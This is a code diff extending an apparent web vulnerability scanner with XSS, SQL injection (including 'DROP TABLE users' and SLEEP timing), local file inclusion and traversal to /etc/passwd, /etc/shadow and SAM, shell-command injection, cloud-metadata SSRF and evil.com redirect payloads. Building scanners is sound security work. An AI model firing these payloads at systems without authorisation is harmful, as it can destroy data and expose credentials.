@@ -16,6 +16,7 @@ export class Scanner {
   private crawledUrls: number = 0;
   private testedForms: number = 0;
   private requestsMade: number = 0;
+  private headersChecked: Set<string> = new Set();
 
   constructor() {
     this.detector = new VulnerabilityDetector();
@@ -49,10 +50,8 @@ export class Scanner {
 
     logger.info(`Starting scan of ${targetUrl} (depth: ${depth}, timeout: ${timeout}ms)`);
 
-    // Start crawling
     await this.crawl(targetUrl, depth, timeout);
 
-    // Close browser
     await this.close();
 
     const duration = Date.now() - startTime;
@@ -84,14 +83,12 @@ export class Scanner {
     const page = await this.browser!.newPage();
 
     try {
-      // Set up request interception
       await page.setRequestInterception(true);
       page.on("request", (request) => {
         this.requestsMade++;
         request.continue();
       });
 
-      // Navigate to page
       const response = await page.goto(url, {
         waitUntil: "networkidle2",
         timeout,
@@ -102,24 +99,24 @@ export class Scanner {
         return;
       }
 
-      // Get response headers
-      const headers = response.headers();
-      this.detector.analyzeSecurityHeaders(url, headers);
+      const host = new URL(url).host;
+      if (!this.headersChecked.has(host)) {
+        this.detector.analyzeSecurityHeaders(url, response.headers());
+        this.headersChecked.add(host);
+      }
 
-      // Get page content
       const content = await page.content();
 
-      // Check for sensitive data
       this.detector.detectSensitiveData(url, content);
+      this.detector.detectInfoDisclosure(url, content);
 
-      // Find and test forms
       await this.testForms(page, url, timeout);
 
-      // Find links and crawl deeper
+      await this.testUrlParameters(page, url, timeout);
+
       if (depth > 1) {
         const links = await this.extractLinks(page, url);
         for (const link of links.slice(0, 10)) {
-          // Limit to 10 links per page
           await this.crawl(link, depth - 1, timeout);
         }
       }
@@ -136,12 +133,10 @@ export class Scanner {
     for (const form of forms) {
       this.testedForms++;
 
-      // Get form HTML for CSRF detection
       const formHtml = await form.evaluate((el) => el.outerHTML);
       this.detector.detectCSRF(url, formHtml);
 
-      // Find input fields
-      const inputs = await form.$$("input, textarea");
+      const inputs = await form.$$("input, textarea, select");
 
       for (const input of inputs) {
         const name = await input.evaluate((el) => el.getAttribute("name"));
@@ -151,12 +146,29 @@ export class Scanner {
           continue;
         }
 
-        // Test for XSS
         await this.testXSS(page, url, name, timeout);
-
-        // Test for SQLi
         await this.testSQLi(page, url, name, timeout);
+        await this.testLFI(page, url, name, timeout);
+        await this.testCMDI(page, url, name, timeout);
       }
+    }
+  }
+
+  private async testUrlParameters(page: Page, baseUrl: string, timeout: number): Promise<void> {
+    try {
+      const url = new URL(baseUrl);
+      const params = Array.from(url.searchParams.keys());
+
+      for (const param of params) {
+        await this.testIDOR(baseUrl, param, timeout);
+        await this.testLFI(page, baseUrl, param, timeout);
+        await this.testPathTraversal(page, baseUrl, param, timeout);
+        await this.testCMDI(page, baseUrl, param, timeout);
+        await this.testSSRF(page, baseUrl, param, timeout);
+        await this.testOpenRedirect(page, baseUrl, param, timeout);
+      }
+    } catch (error) {
+      logger.debug(`Error testing URL parameters: ${(error as Error).message}`);
     }
   }
 
@@ -165,11 +177,12 @@ export class Scanner {
       "<script>alert('XSS')</script>",
       '"><script>alert(1)</script>',
       "<img src=x onerror=alert(1)>",
+      "'-alert(1)-'",
+      "<svg/onload=alert(1)>",
     ];
 
     for (const payload of payloads) {
       try {
-        // Try to inject payload
         const testUrl = this.buildTestUrl(url, param, payload);
         await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
 
@@ -182,9 +195,24 @@ export class Scanner {
   }
 
   private async testSQLi(page: Page, url: string, param: string, timeout: number): Promise<void> {
-    const payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--", "' OR 1=1--"];
+    const errorBasedPayloads = [
+      "'",
+      "1' OR '1'='1",
+      "1; DROP TABLE users--",
+      "' OR 1=1--",
+      "' UNION SELECT 1--",
+      "1' AND '1'='1",
+    ];
 
-    for (const payload of payloads) {
+    const timeBasedPayloads = [
+      "' AND SLEEP(5)--",
+      "1' AND SLEEP(5)--",
+      "'; WAITFOR DELAY '00:00:05'--",
+    ];
+
+    const originalResponse = await page.content();
+
+    for (const payload of errorBasedPayloads) {
       try {
         const testUrl = this.buildTestUrl(url, param, payload);
         await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
@@ -194,6 +222,172 @@ export class Scanner {
       } catch (error) {
         logger.debug(`SQLi test failed for ${param}: ${(error as Error).message}`);
       }
+    }
+
+    const startTime = Date.now();
+    for (const payload of timeBasedPayloads) {
+      try {
+        const testUrl = this.buildTestUrl(url, param, payload);
+        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
+        const testTime = Date.now() - startTime;
+        
+        this.detector.detectBlindSQLi(url, param, 0, testTime);
+      } catch (error) {
+        logger.debug(`Blind SQLi test failed for ${param}: ${(error as Error).message}`);
+      }
+    }
+  }
+
+  private async testLFI(page: Page, url: string, param: string, timeout: number): Promise<void> {
+    const lfiPayloads = [
+      "../../../../etc/passwd",
+      "../../../../../../etc/passwd",
+      "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "/etc/passwd",
+      "/etc/shadow",
+    ];
+
+    for (const payload of lfiPayloads) {
+      try {
+        const testUrl = this.buildTestUrl(url, param, payload);
+        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
+
+        const content = await page.content();
+        this.detector.detectLFI(url, param, payload, content);
+      } catch (error) {
+        logger.debug(`LFI test failed for ${param}: ${(error as Error).message}`);
+      }
+    }
+  }
+
+  private async testPathTraversal(page: Page, url: string, param: string, timeout: number): Promise<void> {
+    const traversalPayloads = [
+      "../../../../etc/passwd",
+      "..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "....//....//....//etc/passwd",
+      "..\\..\\..\\..\\windows\\system32\\config\\sam",
+    ];
+
+    for (const payload of traversalPayloads) {
+      try {
+        const testUrl = this.buildTestUrl(url, param, payload);
+        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
+
+        const content = await page.content();
+        this.detector.detectPathTraversal(url, param, payload, content);
+      } catch (error) {
+        logger.debug(`Path traversal test failed for ${param}: ${(error as Error).message}`);
+      }
+    }
+  }
+
+  private async testCMDI(page: Page, url: string, param: string, timeout: number): Promise<void> {
+    const cmdiPayloads = [
+      "; whoami",
+      "| whoami",
+      "`whoami`",
+      "$(whoami)",
+      "; id",
+      "| id",
+      "; cat /etc/passwd",
+      "| ls -la",
+      "& ping -c 3 127.0.0.1",
+      "&& whoami",
+    ];
+
+    for (const payload of cmdiPayloads) {
+      try {
+        const testUrl = this.buildTestUrl(url, param, payload);
+        await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
+
+        const content = await page.content();
+        this.detector.detectCMDI(url, param, payload, content);
+      } catch (error) {
+        logger.debug(`CMDI test failed for ${param}: ${(error as Error).message}`);
+      }
+    }
+  }
+
+  private async testSSRF(page: Page, url: string, param: string, timeout: number): Promise<void> {
+    const ssrfPayloads = [
+      "http://localhost",
+      "http://127.0.0.1",
+      "http://169.254.169.254/latest/meta-data/",
+      "https://metadata.google.internal/",
+      "http://0.0.0.0",
+      "http://[::1]",
+    ];
+
+    for (const payload of ssrfPayloads) {
+      try {
+        const testUrl = this.buildTestUrl(url, param, payload);
+        
+        try {
+          await page.goto(testUrl, { waitUntil: "networkidle2", timeout: 5000 });
+        } catch {
+        }
+
+        const content = await page.content();
+        this.detector.detectSSRF(url, param, payload, content);
+      } catch (error) {
+        logger.debug(`SSRF test failed for ${param}: ${(error as Error).message}`);
+      }
+    }
+  }
+
+  private async testOpenRedirect(page: Page, url: string, param: string, timeout: number): Promise<void> {
+    const redirectPayloads = [
+      "https://evil.com",
+      "https://google.com",
+      "//evil.com",
+      "///evil.com",
+      "https://google.com%23",
+      "javascript:alert(1)",
+    ];
+
+    for (const payload of redirectPayloads) {
+      try {
+        const testUrl = this.buildTestUrl(url, param, payload);
+        
+        const response = await page.goto(testUrl, { waitUntil: "domcontentloaded", timeout: 5000 });
+        
+        if (response) {
+          const finalUrl = response.url();
+          this.detector.detectOpenRedirect(url, param, payload, finalUrl);
+        }
+      } catch (error) {
+        logger.debug(`Open redirect test failed for ${param}: ${(error as Error).message}`);
+      }
+    }
+  }
+
+  private async testIDOR(baseUrl: string, param: string, timeout: number): Promise<void> {
+    const page = await this.browser!.newPage();
+    
+    try {
+      const url = new URL(baseUrl);
+      const originalValue = url.searchParams.get(param);
+
+      if (!originalValue || isNaN(Number(originalValue))) {
+        return;
+      }
+
+      const originalResponse = await page.goto(baseUrl, { waitUntil: "networkidle2", timeout });
+      const originalContent = originalResponse ? await originalResponse.text() : "";
+
+      const modifiedValue = String(Number(originalValue) + 1);
+      url.searchParams.set(param, modifiedValue);
+      const testUrl = url.toString();
+
+      const testResponse = await page.goto(testUrl, { waitUntil: "networkidle2", timeout });
+      const testContent = testResponse ? await testResponse.text() : "";
+
+      this.detector.detectIDOR(baseUrl, param, originalValue, testContent, originalContent);
+    } catch (error) {
+      logger.debug(`IDOR test failed for ${param}: ${(error as Error).message}`);
+    } finally {
+      await page.close();
     }
   }
 
@@ -208,7 +402,6 @@ export class Scanner {
       anchors.map((a) => a.getAttribute("href")).filter(Boolean)
     );
 
-    const base = new URL(baseUrl);
     const absoluteLinks: string[] = [];
 
     for (const link of links) {
@@ -216,16 +409,14 @@ export class Scanner {
 
       try {
         const absolute = new URL(link, baseUrl);
-        // Only crawl same-origin links
-        if (absolute.origin === base.origin) {
+        if (absolute.origin === new URL(baseUrl).origin) {
           absoluteLinks.push(absolute.toString());
         }
       } catch {
-        // Invalid URL, skip
       }
     }
 
-    return [...new Set(absoluteLinks)]; // Remove duplicates
+    return [...new Set(absoluteLinks)];
   }
 
   async close(): Promise<void> {
